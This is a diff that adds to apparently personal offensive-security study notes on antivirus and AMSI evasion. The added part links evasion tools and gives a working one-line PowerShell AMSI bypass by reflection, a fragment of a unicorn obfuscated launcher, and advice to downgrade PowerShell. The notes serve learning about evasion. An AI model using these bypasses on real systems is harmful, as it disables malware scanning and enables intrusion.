@@ -214,4 +214,35 @@
 - Split file until kilobyte range
 - [Find-AVSignature](https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1)
 - Other tools: DefenderCheck, ThreatCheck, AMSITrigger
-  
+
+## Runtime Detection
+- Scan code before execution
+  - directly from memory
+- CRL = Common Language Runtime
+- DLR = Dynamic Language Runtime
+- [Amsi Fail](http://amsi.fail/)
+
+- How
+  - Donwgrade powershell
+  - Powershell -Version 2
+```
+https://github.com/trustedsec/unicorn
+
+full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
+```
+
+- Reflection
+```
+# Reflection to modify and bypass AMSI
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# use assembly from Ref.Assembly
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+
+# Pipe the previous to this and obtein the field speified
+GetField('amsiInitFailed','NonPublic,Static').
+
+# the result of previous actions will have the new value set
+SetValue($null,$true)
+```
+
